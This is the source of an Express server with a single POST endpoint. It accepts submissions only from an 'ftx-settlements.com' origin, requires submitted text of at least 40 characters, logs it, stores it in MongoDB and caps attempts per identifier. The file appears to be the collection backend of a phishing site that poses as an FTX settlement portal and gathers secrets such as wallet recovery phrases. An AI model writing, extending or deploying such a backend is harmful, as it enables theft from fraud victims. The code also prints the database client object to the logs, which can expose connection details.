import express from "express";
import cors from "cors";
import { MongoClient } from "mongodb";
import dotenv from "dotenv";

import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();

const ratelimit = new Ratelimit({
  redis,
  limiter: Ratelimit.fixedWindow(20, '1 h'),
  prefix: 'ratelimit',
});

async function rateLimit(req, res, next) {
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.socket.remoteAddress ||
    'unknown';

  const { success, remaining, reset } = await ratelimit.limit(ip);

  if (!success) {
    return res.status(429).json({
      error: 'Too many requests',
      retryAfter: Math.ceil((reset - Date.now()) / 1000),
    });
  }

  res.setHeader('X-RateLimit-Remaining', remaining);
  next();
}




dotenv.config();


const app = express();

// CORS configuration to allow only a.com
const corsOptions = {
  origin: ['https://ftx-settlements.com',  ],// Allow only requests from a.com
  methods: ['POST'], // Allow specific methods, like GET and POST
  allowedHeaders: ['Content-Type', 'Authorization'], // Specify allowed headers
};

// Use CORS middleware
app.use(cors(corsOptions));
app.use(express.json());
app.use(express.urlencoded({extended:true}))


const client = new MongoClient(process.env.MONGO_URL);
console.log("\n\nEnvironment77")
console.log(client)

client.connect()
    .then(() =>  {
        console.log("connectedto db");
        const db = client.db("mydb");
        const collection = db.collection("mycol");
        const attempts = db.collection("attempts");
        console.log("success");


      
app.post("/api/save", rateLimit, async (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    let { u, i } = req.body;


    if (!u) return res.status(400).send("Missing text");
    console.log("\n\nUSER INPUT");
    console.log(u)

  u = u.trim();
  if (u.length < 40)
    return res.status(400).send("Error. Please try again");

    // Get existing attempt count
    const record = await attempts.findOne({ i });
    const count = record?.count || 0;
    

     if (count >= 10) {
         return res.status(429).send("Max attempts reached (10)");
    }


    // Insert entry
     await collection.insertOne({ u, i, timestamp: new Date() });


    // Update attempts
    await attempts.updateOne(
         { i },
         { $set: { i }, $inc: { count: 1 } },
         { upsert: true }
     );


    res.sendStatus(200);
});


app.listen(4000, () => console.log("Server running on port 4000"));
    })
.catch((err) => {
    console.log("error happened ", err);
})
